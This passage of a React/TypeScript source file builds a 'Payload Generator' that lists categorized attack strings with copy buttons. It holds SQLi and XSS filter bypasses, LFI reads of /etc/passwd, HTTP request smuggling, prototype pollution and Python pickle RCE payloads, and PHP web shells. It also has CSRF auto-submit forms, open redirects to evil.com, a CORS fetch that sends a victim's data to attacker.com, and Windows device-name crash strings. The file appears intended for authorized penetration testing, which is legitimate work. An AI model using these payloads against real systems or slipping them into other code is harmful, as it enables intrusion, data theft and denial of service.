      { name: "SQLi — versioned comment",        payload: `' /*!50000UNION SELECT*/ NULL,NULL--`, note: "MySQL version >= 5.0.0" },
      { name: "SQLi — mixed case",              payload: `' uNiOn SeLeCt NULL,NULL--` },
      { name: "SQLi — URL encode",              payload: `%27%20OR%201%3D1--` },
      { name: "SQLi — double URL encode",       payload: `%2527%2520OR%25201%253D1--` },
      { name: "SQLi — hex values",              payload: `' OR 0x313d31--`, note: "0x313d31 = '1=1'" },
      { name: "SQLi — scientific notation",      payload: `' OR 1e0=1e0--` },
      { name: "SQLi — whitespace bypass",       payload: `'/**/OR/**/1=1--` },
      { name: "SQLi — newline separator",       payload: `'\nOR\n1=1--` },
      { name: "SQLi — tab separator",           payload: `'\tOR\t1=1--` },
      { name: "XSS — eval atob",               payload: `<script>eval(atob('YWxlcnQoMSk='))</script>`, note: "atob('YWxlcnQoMSk=') = alert(1)" },
      { name: "XSS — fromCharCode",             payload: `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>`, note: "Decodes to alert(1)" },
      { name: "XSS — hex encoding",             payload: "<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>" },
      { name: "XSS — octal encoding",           payload: "<script>\\141\\154\\145\\162\\164(1)</script>" },
      { name: "XSS — template literal bypass",  payload: "<script>Function`alert``1`</script>" },
      { name: "XSS — no parentheses",           payload: `<script>onerror=alert;throw 1</script>` },
      { name: "XSS — via JavaScript protocol",  payload: "<a href=`javascript:alert`1``>click</a>" },
      { name: "LFI — 16 dots",                 payload: `....//....//....//etc/passwd` },
      { name: "LFI — double slash",            payload: `..//..//..//etc/passwd` },
      { name: "LFI — reverse solidus",         payload: `..\\..\\..\\etc\\passwd` },
      { name: "Header — X-Forwarded-For bypass",payload: `X-Forwarded-For: 127.0.0.1`, note: "Admin IP whitelist bypass" },
      { name: "Header — X-Real-IP bypass",      payload: `X-Real-IP: 127.0.0.1`, note: "Spoof source IP" },
      { name: "Header — X-Original-URL bypass", payload: `X-Original-URL: /admin`, note: "Nginx/Apache path override" },
      { name: "Header — X-Rewrite-URL bypass",  payload: `X-Rewrite-URL: /admin` },
      { name: "Chunked encoding smuggle",       payload: `Transfer-Encoding: chunked\r\n\r\n5\r\nHELLO\r\n0\r\n\r\n`, note: "HTTP request smuggling vector" },
      { name: "Content-Type switch",            payload: `Content-Type: application/json`, note: "Switch JSON→XML to bypass body WAF" },
      { name: "User-Agent randomize",           payload: `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36`, note: "Avoid default sqlmap UA detection" },
    ],
  },
  {
    key: "open_redirect",
    label: "Open Redirect",
    description: "Open redirect bypass payloads for phishing and SSRF chains",
    color: "text-teal-400",
    payloads: [
      { name: "Basic",                          payload: `https://evil.com` },
      { name: "Double slash",                   payload: `//evil.com` },
      { name: "Backslash bypass",               payload: `\/\/evil.com` },
      { name: "CRLF injection",                 payload: `https://evil.com%0d%0aLocation: https://evil.com` },
      { name: "URL with @ symbol",              payload: `https://safe.com@evil.com` },
      { name: "IPv6",                           payload: `http://[::1]@evil.com/` },
      { name: "Javascript redirect",            payload: `javascript:window.location='https://evil.com'` },
      { name: "URL-encoded slash",              payload: `%2F%2Fevil.com` },
      { name: "Protocol-relative",             payload: `///evil.com` },
      { name: "Null byte termination",          payload: `https://evil.com%00.trusted.com` },
      { name: "Subdomain bypass",               payload: `https://trusted.com.evil.com` },
      { name: "Open redirect + SSRF chain",     payload: `https://trusted.com/redirect?url=http://169.254.169.254/`, note: "Use open redirect on trusted domain to pivot to SSRF" },
    ],
  },
  {
    key: "prototype_pollution",
    label: "Prototype Pollution",
    description: "JavaScript prototype pollution — client-side, server-side (Node.js), to XSS/RCE",
    color: "text-lime-400",
    payloads: [
      { name: "Basic — __proto__",              payload: `?__proto__[admin]=1` },
      { name: "Basic — constructor.prototype",  payload: `?constructor[prototype][admin]=1` },
      { name: "JSON body — __proto__",          payload: `{"__proto__": {"admin": true}}`, note: "POST body — pollutes all objects" },
      { name: "JSON body — constructor",        payload: `{"constructor": {"prototype": {"admin": true}}}` },
      { name: "Nested merge pollution",          payload: `{"__proto__": {"isAdmin": true, "role": "admin"}}` },
      { name: "Pollution → XSS (innerHTML)",    payload: `?__proto__[innerHTML]=<img src=x onerror=alert(1)>`, note: "If app renders Object.keys()" },
      { name: "Pollution → RCE (Node.js)",      payload: `{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}}`, note: "Crash and debug injection" },
      { name: "lodash deep merge pollution",    payload: `{"__proto__": {"polluted": "yes"}}`, note: "lodash < 4.17.11 vulnerable to _.merge()" },
      { name: "hoek pollution",                 payload: `{"__proto__": {"admin": true}}`, note: "hoek < 4.2.1 vulnerable" },
    ],
  },
  {
    key: "http_smuggling",
    label: "HTTP Smuggling",
    description: "HTTP request smuggling — CL.TE, TE.CL, TE.TE desync attacks",
    color: "text-purple-400",
    payloads: [
      {
        name: "CL.TE — basic",
        payload: `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG`,
        note: "Front-end uses Content-Length, back-end uses Transfer-Encoding",
      },
      {
        name: "TE.CL — basic",
        payload: `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`,
        note: "Front-end uses Transfer-Encoding, back-end uses Content-Length",
      },
      {
        name: "TE.TE — obfuscated header",
        payload: `POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\n`,
        note: "Obfuscate TE to force servers to use different parser",
      },
      {
        name: "CLTE — capture next request",
        payload: `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 41\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n`,
        note: "Poison next user's request",
      },
      {
        name: "TE obfuscation — space",
        payload: `Transfer-Encoding : chunked`, note: "Space before colon confuses some parsers",
      },
      {
        name: "TE obfuscation — tab",
        payload: `Transfer-Encoding:\tchunked`, note: "Tab character confuses some parsers",
      },
      {
        name: "TE obfuscation — newline wrap",
        payload: `Transfer-Encoding:\n chunked`, note: "Line fold confuses some parsers",
      },
    ],
  },
  {
    key: "graphql",
    label: "GraphQL Attacks",
    description: "GraphQL introspection, IDOR, batching attacks, injection through arguments",
    color: "text-pink-300",
    payloads: [
      {
        name: "Introspection — full schema",
        payload: `{"query":"{ __schema { types { name fields { name } } } }"}`,
        note: "Reveals entire API schema — often left enabled in dev",
      },
      {
        name: "Introspection — type info",
        payload: `{"query":"{ __type(name: \\"User\\") { fields { name type { name } } } }"}`,
      },
      {
        name: "Introspection — all queries",
        payload: `{"query":"{ __schema { queryType { fields { name description } } } }"}`,
      },
      {
        name: "IDOR — access other user",
        payload: `{"query":"{ user(id: 2) { email password role } }"}`,
        note: "Try incrementing ID to access other users",
      },
      {
        name: "Auth bypass — admin field",
        payload: `{"query":"{ user(id: 1) { isAdmin secretToken } }"}`,
        note: "Request sensitive fields not meant to be exposed",
      },
      {
        name: "Batch query attack (rate limit bypass)",
        payload: `[{"query":"mutation { login(user:\\"admin\\", pass:\\"pass1\\") { token } }"},{"query":"mutation { login(user:\\"admin\\", pass:\\"pass2\\") { token } }"}]`,
        note: "Send many mutations in one request to bypass rate limits",
      },
      {
        name: "SQLi via GraphQL argument",
        payload: `{"query":"{ user(name: \\"' OR 1=1--\\") { email } }"}`,
        note: "GraphQL args not immune to SQLi if not parameterized",
      },
      {
        name: "SSRF via GraphQL URL fetch",
        payload: `{"query":"{ fetchUrl(url: \\"http://169.254.169.254/latest/meta-data/\\") { content } }"}`,
      },
      {
        name: "Alias batching — brute force",
        payload: `{"query":"{ a1:login(user:\\"admin\\",pass:\\"password1\\"){token} a2:login(user:\\"admin\\",pass:\\"password2\\"){token} a3:login(user:\\"admin\\",pass:\\"password3\\"){token} }"}`,
        note: "Use GraphQL aliases to brute-force in a single request",
      },
    ],
  },
  {
    key: "deserialization",
    label: "Deserialization",
    description: "Insecure deserialization — Java, PHP, Python, .NET gadget chains",
    color: "text-orange-300",
    payloads: [
      { name: "PHP — O: object notation",       payload: `O:4:"User":1:{s:4:"name";s:5:"admin";}`, note: "Change serialized object properties" },
      { name: "PHP — admin role escalation",    payload: `O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}` },
      { name: "PHP — RCE via __wakeup",         payload: `O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}`, note: "Works if class has __wakeup with exec()" },
      { name: "Python — pickle RCE",            payload: `cos\nsystem\n(S'id'\ntR.`, note: "Base64 encode then send as cookie/param" },
      { name: "Java — base64 ysoserial",        payload: `rO0AB...`, note: "Use ysoserial to generate payload: java -jar ysoserial.jar CommonsCollections1 'id'" },
      { name: "Java — Content-Type header",     payload: `application/x-java-serialized-object`, note: "Check if API accepts Java serialized objects" },
      { name: ".NET — ViewState tampering",      payload: `__VIEWSTATE=/wEPDwUKLTkxNTM3ODcwOGRkFLfCHYMGk...`, note: "Tamper ViewState if not MAC-protected" },
      { name: "Ruby — Marshal.load",            payload: `\x04\x08o:\nAdmin\x06:\trole\"\nadmin`, note: "Ruby YAML/Marshal deserialization" },
      { name: "Node.js — eval via JSON",        payload: `{"__proto__": {"nodeProto": "require('child_process').exec('id')"}}`, note: "Combined prototype pollution + deser" },
      { name: "JWT — RS256 to HS256",           payload: `{"alg":"HS256"}`, note: "Sign with RSA public key as HMAC secret" },
    ],
  },
  {
    key: "crlf",
    label: "CRLF Injection",
    description: "Carriage Return Line Feed injection — HTTP response splitting, header injection",
    color: "text-sky-400",
    payloads: [
      { name: "Basic CRLF",                     payload: `%0d%0aHeader: injected` },
      { name: "Double URL-encoded",             payload: `%250d%250aHeader: injected` },
      { name: "Unicode CRLF",                   payload: `%E5%98%8D%E5%98%8AHeader: injected` },
      { name: "Set-Cookie via CRLF",            payload: `%0d%0aSet-Cookie: sessionid=attacker`, note: "Inject attacker session" },
      { name: "XSS via CRLF (response split)", payload: `%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Length: 27%0d%0a%0d%0a<script>alert(1)</script>`, note: "HTTP response splitting for older proxies" },
      { name: "Log injection",                  payload: `%0d%0a127.0.0.1 - admin [01/Jan/2024] "GET /admin" 200`, note: "Inject fake log entry" },
      { name: "Redirect via Location",          payload: `%0d%0aLocation: https://evil.com`, note: "Force redirect via header injection" },
      { name: "Cache poisoning via CRLF",       payload: `%0d%0aX-Cache-Poison: true`, note: "Inject cache poisoning header" },
    ],
  },
  {
    key: "oauth",
    label: "OAuth / OIDC",
    description: "OAuth 2.0 and OpenID Connect attack payloads — redirect_uri abuse, state CSRF, token leakage, open redirect chains",
    color: "text-blue-400",
    payloads: [
      { name: "redirect_uri — open redirect",     payload: `?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com`, note: "Try unvalidated redirect_uri" },
      { name: "redirect_uri — subdomain bypass",  payload: `?redirect_uri=https://evil.com.legit.com/callback` },
      { name: "redirect_uri — path traversal",    payload: `?redirect_uri=https://legit.com/callback/../../../evil.com` },
      { name: "redirect_uri — URL fragment",      payload: `?redirect_uri=https://legit.com%23@evil.com/callback` },
      { name: "redirect_uri — double slash",      payload: `?redirect_uri=https://legit.com//evil.com/callback` },
      { name: "state CSRF — missing state",       payload: `GET /oauth/authorize?response_type=code&client_id=ID (no state param)`, note: "Missing state = CSRF on auth flow" },
      { name: "state CSRF — predictable state",   payload: `?state=1234`, note: "Predictable state allows cross-site flow hijack" },
      { name: "Implicit flow token leak",         payload: `?response_type=token&redirect_uri=https://attacker.com`, note: "Token leaked in URL fragment" },
      { name: "Authorization code interception",  payload: `Referer: https://attacker.com/page`, note: "Code leaked via Referer header to embedded resource" },
      { name: "PKCE downgrade (no code_challenge)",payload: `?response_type=code&client_id=ID&redirect_uri=URI (no code_challenge)` },
      { name: "nonce reuse (OIDC replay)",        payload: `id_token with reused nonce value`, note: "Replay attack on OIDC token" },
      { name: "iss claim confusion",              payload: `{"iss":"https://evil.com","sub":"admin"}`, note: "Claim confusion when multiple IdPs accepted" },
      { name: "kid claim SQLi",                   payload: `{"kid":"x' UNION SELECT 'secretkey'--"}`, note: "SQLi via kid header in JWT used for key lookup" },
      { name: "Mix-up attack — code interception",payload: `Start auth at IdP A, redirect intercepted to evil server posing as IdP B` },
    ],
  },
  {
    key: "csrf",
    label: "CSRF",
    description: "Cross-Site Request Forgery — form auto-submit, JSON CSRF, SameSite bypass, Flash exploitation",
    color: "text-amber-400",
    payloads: [
      { name: "HTML form auto-submit (GET)",      payload: `<img src="https://target.com/delete-account?confirm=yes">` },
      { name: "HTML form auto-submit (POST)",     payload: `<form method="POST" action="https://target.com/transfer"><input name="amount" value="1000"><input name="to" value="attacker"></form><script>document.forms[0].submit()</script>` },
      { name: "JSON CSRF via form",               payload: `<form enctype="text/plain" method="POST" action="https://target.com/api"><input name='{"action":"deleteUser","id":' value='1}'></form>` },
      { name: "CSRF with fetch (CORS allow-all)", payload: `fetch('https://target.com/api/transfer',{method:'POST',body:JSON.stringify({amount:1000}),credentials:'include'})` },
      { name: "CSRF via iframe auto-reload",      payload: `<iframe src="https://target.com/logout" onload="this.src='https://target.com/transfer?to=attacker&amount=9999'">` },
      { name: "SameSite=Lax bypass — GET",        payload: `<a href="https://target.com/transfer?to=attacker&amount=9999">click</a>`, note: "GET mutations bypass SameSite=Lax" },
      { name: "Origin header spoof attempt",      payload: `Origin: https://target.com`, note: "Test if server validates Origin correctly" },
      { name: "Referer-based bypass",             payload: `Referer: https://target.com.evil.com/page`, note: "Partial match on Referer header" },
      { name: "Double submit cookie bypass",      payload: `csrf_token=attacker_value (in cookie and param)`, note: "If server only compares cookie to param without server-state" },
    ],
  },
  {
    key: "cors",
    label: "CORS Bypass",
    description: "Cross-Origin Resource Sharing misconfiguration payloads — wildcard, null origin, subdomain bypass",
    color: "text-teal-400",
    payloads: [
      { name: "Null origin",                      payload: `Origin: null`, note: "Some servers reflect null — exploitable from sandboxed iframes" },
      { name: "Arbitrary origin reflection",      payload: `Origin: https://attacker.com`, note: "If server reflects any Origin with Allow-Credentials: true" },
      { name: "Trusted domain prefix bypass",     payload: `Origin: https://trusted.com.evil.com`, note: "Prefix match allows attacker subdomain" },
      { name: "Trusted domain suffix bypass",     payload: `Origin: https://eviltrusted.com`, note: "Suffix match allows attacker domain" },
      { name: "Subdomain XSS → CORS exploit",     payload: `Compromise sub.trusted.com, then use its Origin to extract sensitive data`, note: "Subdomain takeover enables CORS bypass" },
      { name: "HTTP downgrade (HTTPS→HTTP CORS)", payload: `Origin: http://trusted.com`, note: "Some servers allow HTTP origin for HTTPS site" },
      { name: "Exploit via fetch (with creds)",   payload: `fetch('https://target.com/api/data',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))` },
      { name: "CORS with wildcard (*) + creds",   payload: `Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true`, note: "Misconfiguration — browsers block but worth testing" },
    ],
  },
  {
    key: "file_upload",
    label: "File Upload Bypass",
    description: "File upload restriction bypass — MIME type spoofing, extension tricks, polyglot files, path traversal in filename",
    color: "text-lime-400",
    payloads: [
      { name: "PHP in .jpg extension",            payload: `<?php system($_GET['cmd']); ?>`, note: "Upload as shell.jpg if server executes PHP" },
      { name: "Double extension",                 payload: `shell.php.jpg`, note: "Some servers use first extension for MIME, second for exec" },
      { name: "Null byte extension (old PHP)",    payload: `shell.php%00.jpg`, note: "PHP < 5.3 truncates at null byte" },
      { name: "Case variation",                   payload: `shell.PHP`, note: "Windows/IIS may execute .PHP same as .php" },
      { name: "MIME type spoofing (Content-Type)",payload: `Content-Type: image/jpeg\r\n\r\n<?php system($_GET['cmd']); ?>` },
      { name: "SVG with script (XSS)",            payload: `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`, note: "Upload as .svg" },
      { name: "HTML file XSS",                    payload: `<script>alert(1)</script>`, note: "Upload as .html if rendered by server" },
      { name: "Zip slip (path traversal in zip)", payload: `../../../etc/cron.d/shell`, note: "Filename inside zip traverses directory" },
      { name: "GIF magic bytes + PHP",            payload: `GIF89a\n<?php system($_GET['cmd']); ?>`, note: "GIF header fools MIME type check, PHP still executes" },
      { name: "PDF with JavaScript",              payload: `%PDF-1.4\n1 0 obj<</Type /Action /S /JavaScript /JS (app.alert('XSS'))>>`, note: "PDF JS action for XSS in PDF viewers" },
      { name: "Filename path traversal",          payload: `../../etc/passwd`, note: "Filename parameter used in file system path" },
      { name: ".htaccess override",               payload: `AddType application/x-httpd-php .jpg`, note: "Upload .htaccess to make JPGs execute as PHP" },
    ],
  },
  {
    key: "business_logic",
    label: "Business Logic",
    description: "Business logic attacks — negative prices, integer overflow, race conditions, forced browsing, workflow bypass",
    color: "text-violet-400",
    payloads: [
      { name: "Negative price/quantity",          payload: `quantity=-1&price=-100`, note: "Negative values that credit the attacker" },
      { name: "Integer overflow",                 payload: `quantity=9999999999999999`, note: "Overflow to wrap around to 0 or negative" },
      { name: "Zero price",                       payload: `price=0`, note: "Force zero price on checkout" },
      { name: "Coupon stacking",                  payload: `Apply same coupon code multiple times`, note: "If client-side coupon validation only" },
      { name: "Race condition — coupon reuse",    payload: `Send 20 concurrent POST /apply-coupon requests`, note: "Race to reuse single-use coupon" },
      { name: "Race condition — buy/refund",      payload: `POST /purchase then immediately POST /refund`, note: "Item ships but money returned" },
      { name: "Forced browsing — skip payment",   payload: `Navigate directly to /order-confirmation without paying` },
      { name: "Password reset token reuse",       payload: `Use same reset token multiple times if not invalidated` },
      { name: "Workflow bypass — step skipping",  payload: `POST to /step-4 without completing steps 1-3` },
      { name: "Mass assignment — role escalation",payload: `{"username":"attacker","role":"admin"}`, note: "Extra fields accepted in user update" },
      { name: "Time-based price bypass",          payload: `Apply promo code, change system time, checkout` },
    ],
  },
  {
    key: "win_reserved",
    label: "Windows Reserved Names",
    description: "Windows device filename DoS/bypass — CON, NUL, AUX, PRN, COM1–COM9, LPT1–LPT9 cause crashes, hangs, or filter bypasses in Windows apps and web servers",
    color: "text-blue-400",
    payloads: [
      { name: "CON — bare",                         payload: `CON`,                                        note: "Console device — freezes any Windows app that tries to open/write this" },
      { name: "NUL — bare",                         payload: `NUL`,                                        note: "Null device — discards all data; causes silent write failures" },
      { name: "AUX — bare",                         payload: `AUX`,                                        note: "Auxiliary port — alias for COM1; hangs on open" },
      { name: "PRN — bare",                         payload: `PRN`,                                        note: "Printer device — hangs if no printer attached" },
      { name: "COM1 – COM9",                        payload: `COM1`,                                       note: "Serial port devices — substitute COM2–COM9; hangs on open" },
      { name: "LPT1 – LPT9",                        payload: `LPT1`,                                       note: "Parallel port devices — substitute LPT2–LPT9; hangs on open" },
      { name: "CON with extension",                  payload: `CON.txt`,                                    note: "Windows strips the extension — still resolves to CON device" },
      { name: "NUL with PHP extension",              payload: `NUL.php`,                                    note: "File upload filter sees .php but Windows opens NUL — bypass + DoS" },
      { name: "CON with image extension",            payload: `CON.jpg`,                                    note: "File upload bypass — passes MIME check, crashes on write" },
      { name: "AUX with double extension",           payload: `AUX.php.jpg`,                                note: "Double extension + device name" },
      { name: "CON trailing dot",                    payload: `CON.`,                                       note: "Windows strips trailing dot — resolves to CON device; bypasses basic filters" },
      { name: "CON trailing spaces",                 payload: `CON   `,                                     note: "Windows strips trailing spaces — resolves to CON device" },
      { name: "CON as directory component",          payload: `/uploads/CON/file.txt`,                      note: "Device name in path segment causes hang during path resolution" },
      { name: "NUL in URL path",                    payload: `/files/NUL.pdf`,                             note: "Server-side file operation on this path hangs on Windows" },
      { name: "CON URL-encoded",                    payload: `%43%4F%4E`,                                  note: "URL-decoded to CON — bypasses string-match filters" },
      { name: "CON — JSON filename field",           payload: `{"filename":"CON","type":"text/plain"}`,     note: "Embed in JSON body for API file upload endpoints" },
      { name: "NUL — multipart filename",            payload: `Content-Disposition: form-data; name="file"; filename="NUL.pdf"`, note: "Multipart upload — server hangs writing to NUL" },
      { name: "CON — XML filename element",         payload: `<filename>CON</filename>`,                   note: "XML body with device name in filename field" },
      { name: "CON mixed case",                     payload: `con`,                                        note: "Windows device names are case-insensitive — con = CON = Con" },
      { name: "CON Unicode fullwidth",              payload: `ＣＯＮ`,                                      note: "Fullwidth Unicode chars — some normalizers map to CON" },
      { name: "Path traversal to CON",              payload: `../../CON`,                                  note: "Combine path traversal with device name" },
      { name: "CON in ZIP entry name",              payload: `CON.txt (inside zip archive)`,               note: "Zip extraction to CON device name causes hang on Windows" },
      { name: "PRN in Content-Disposition",         payload: `filename="PRN.docx"`,                       note: "Download trigger with PRN device name crashes IIS/Windows handlers" },
      { name: "All device names — wordlist",        payload: `CON\nNUL\nAUX\nPRN\nCOM1\nCOM2\nCOM3\nCOM4\nCOM5\nCOM6\nCOM7\nCOM8\nCOM9\nLPT1\nLPT2\nLPT3\nLPT4\nLPT5\nLPT6\nLPT7\nLPT8\nLPT9`, note: "Full wordlist for fuzzing filename parameters" },
    ],
  },
  {
    key: "parser_confusion",
    label: "Parser Confusion",
    description: "Malformed markup, tag nesting attacks, and HTML/XML parser confusion — bypass WAFs, sanitizers, and crash legacy parsers that fail on invalid input",
    color: "text-fuchsia-400",
    payloads: [
      { name: "Nested unclosed tags",               payload: `<a href=<<font<<b`,                          note: "Unclosed/nested tags confuse HTML parsers and WAFs that track tag state" },
      { name: "Broken self-close chain",            payload: `</<a href=<<font`,                           note: "Invalid self-close with nested attributes — breaks tag-balance validators" },
      { name: "Mixed case tag splitting",           payload: `<fade<Fade<alt<Alt`,                         note: "Mixed-case repeated tags confuse case-insensitive parsers" },
      { name: "Script tag split — reassembly",      payload: `<sc<script>ript>alert(1)</sc</script>ript>`, note: "WAF strips inner <script>, outer fragments reassemble into working tag" },
      { name: "Style/pre confusion",                payload: `</style><style><pre=>`,                      note: "Closing non-open tags then reopening — confuses CSS-aware parsers" },
      { name: "HTML comment flooding",              payload: `<!--<!--<!--<!--<!--<!--<!--<!--<!--<!--`,     note: "Nested/unclosed comments break comment-stripping sanitizers" },
      { name: "Recursive attribute injection",      payload: `<font size=<<SIZE=?<url<<font size=<<color=>>`, note: "Attribute values that contain tag-like syntax confuse attribute parsers" },
      { name: "Angle bracket flood",                payload: `<<<<<<<<<<<<<<<<<<<<`,                       note: "Raw flood of opening angle brackets — buffer/state machine exhaustion" },
      { name: "Invalid close tag flood",            payload: `</</</</</</</</</</</</</</</</</</`, note: "Repeated invalid close tags — triggers parser error recovery loops" },
      { name: "Mixed open/close flood",             payload: `<>><><><><><><><><>`,                        note: "Alternating open/close with no tag name — parser state confusion" },
      { name: "Bracket and entity mix",             payload: `&lt;<script&gt;alert(1)&lt;</script&gt;`,    note: "Mix raw brackets and HTML entities — some decoders reassemble into script" },
      { name: "Null byte in tag",                   payload: `<scr\x00ipt>alert(1)</scr\x00ipt>`,         note: "Null byte inside tag name — bypasses string-match WAF rules" },
      { name: "Tab/newline in tag",                 payload: "<img\tsrc=x\nonerror=alert(1)>",             note: "Whitespace variants inside tags — bypasses regex-based filters" },
      { name: "Double-open bracket",                payload: `<<script>alert(1)<</script>`,                note: "Double opening bracket — some parsers skip first, execute second" },
      { name: "Attribute without quotes — chained", payload: `<img src=x onerror=alert(1) <img src=y>`,   note: "Unchained attributes with embedded second tag" },
      { name: "CDATA in HTML context",              payload: `<![CDATA[<script>alert(1)</script>]]>`,      note: "CDATA section valid in XML/SVG — may pass HTML sanitizers" },
      { name: "PI (processing instruction)",        payload: `<?xml-stylesheet type="text/xsl" href="data:,<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform'/>">`, note: "XML PI injection in SVG/XML context" },
      { name: "Deeply nested tags",                 payload: `<b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b><b>x</b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b></b>`, note: "Deep nesting causes quadratic parser behavior (ReDoS-style)" },
      { name: "Unclosed tag at EOF",                payload: `<div class="x"><span id="y"><b>text`,       note: "Unterminated tags — tests error-recovery path in parsers" },
      { name: "Foreign content (MathML in HTML)",   payload: `<math><mtext></p><img src=x onerror=alert(1)>`, note: "MathML parsing switches context — img inside mtext may execute" },
      { name: "SVG foreignObject XSS",              payload: `<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>`, note: "SVG namespace switch into HTML — script executes in some browsers" },
      { name: "Broken fade color chain",            payload: `<fade #C60000, #000000, #C60000, #000000, #C60000, #000000>`, note: "Yahoo Messenger-style chat markup — crashes IM clients that parse color tags" },
      { name: "Windows device in snd tag",          payload: `<snd=con/con>`,                              note: "Legacy chat booter: snd tag referencing CON device causes Windows app crash" },
      { name: "NUL device sound tag",               payload: `<snd=nul/nul>`,                              note: "NUL device in sound attribute — legacy crash vector for IM parsers" },
      { name: "Repeated garbage attributes",        payload: `<font size=<size=<size=<size=<size=<size=`,  note: "Cascading malformed attribute values — exhausts regex backtracking in WAFs" },
    ],
  },
];

export default function PayloadGen() {
  const [activeKey, setActiveKey]   = usePersistedState<string>("payloadgen-key", CATEGORIES[0].key);
  const [search, setSearch]         = usePersistedState<string>("payloadgen-search", "");
  const [copied, setCopied]         = useState<string | null>(null);

  const active = CATEGORIES.find(c => c.key === activeKey)!;

  const filtered = active.payloads.filter(p =>
    !search || p.name.toLowerCase().includes(search.toLowerCase()) || p.payload.toLowerCase().includes(search.toLowerCase())
  );

  function copy(text: string) {
    navigator.clipboard.writeText(text);
    setCopied(text);
    setTimeout(() => setCopied(null), 1500);
  }

  function copyAll() {
    const all = filtered.map(p => p.payload).join("\n");
    navigator.clipboard.writeText(all);
    setCopied("__all__");
    setTimeout(() => setCopied(null), 1500);
  }

  return (
    <div className="max-w-5xl mx-auto space-y-5">
      <div>
        <h1 className="text-2xl font-bold text-white">Payload Generator</h1>
        <p className="text-white/60 text-sm mt-1">
          Comprehensive payload library — XSS · SQLi · CMDi · LFI · SSRF · XXE · SSTI · NoSQL · Reverse Shells · WAF Bypass · HTTP Smuggling · GraphQL · Deserialization · CRLF · Open Redirect · OAuth/OIDC · CSRF · CORS · File Upload · Business Logic · Windows Reserved Names · Parser Confusion
        </p>
      </div>

      {/* Category tabs */}
      <div className="flex flex-wrap gap-2">
        {CATEGORIES.map(c => (
          <button
            key={c.key}
            onClick={() => { setActiveKey(c.key); setSearch(""); }}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold border transition-colors ${
              activeKey === c.key
                ? "border-primary/50 bg-primary/10 text-primary"
                : "border-white/10 bg-white/[0.03] text-white/50 hover:text-white hover:border-white/20"
            }`}
          >{c.label}</button>
        ))}
      </div>

      {/* Category header + search */}
      <div className="bg-white/[0.04] border border-white/10 rounded-xl p-4 space-y-3">
        <div className="flex items-center justify-between flex-wrap gap-3">
          <div>
            <div className={`text-sm font-bold ${active.color}`}>{active.label}</div>
            <div className="text-xs text-white/40 mt-0.5">{active.description}</div>
          </div>
          <div className="flex items-center gap-2">
            <input
              className="bg-black/30 border border-white/10 rounded-lg px-3 py-1.5 text-xs text-white/80 focus:outline-none focus:border-primary/40 w-40"
              placeholder="Search payloads…"
              value={search}
              onChange={e => setSearch(e.target.value)}
            />
            <button
              onClick={copyAll}
              className="px-3 py-1.5 text-xs font-semibold bg-white/[0.07] border border-white/10 text-white/70 hover:text-white rounded-lg transition-colors"
            >
              {copied === "__all__" ? "Copied all!" : `Copy all (${filtered.length})`}
            </button>
          </div>
        </div>

        <div className="space-y-2">
          {filtered.map((p, i) => (
            <div key={i} className="group flex items-start gap-3 bg-black/20 border border-white/[0.06] rounded-lg p-3 hover:border-white/15 transition-colors">
              <div className="flex-1 min-w-0 space-y-1">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-xs font-semibold text-white/80">{p.name}</span>
                  {p.note && (
                    <span className="text-xs text-yellow-400/60 italic">{p.note}</span>
                  )}
                </div>
                <code className="block text-xs font-mono text-green-400/80 whitespace-pre-wrap break-all">{p.payload}</code>
              </div>
              <button
                onClick={() => copy(p.payload)}
                className="shrink-0 text-xs text-white/30 group-hover:text-white/60 bg-white/[0.04] hover:bg-white/[0.09] px-2 py-1 rounded transition-colors"
              >
                {copied === p.payload ? "✓" : "Copy"}
              </button>
            </div>
          ))}
          {filtered.length === 0 && (
            <div className="text-center text-white/30 text-sm py-6">No payloads match your search.</div>
          )}
        </div>
      </div>

      <div className="text-xs text-white/25 text-center">
        These payloads are for authorized security testing only. Never use against systems you don't own or have written permission to test.
      </div>
    </div>
  );
}
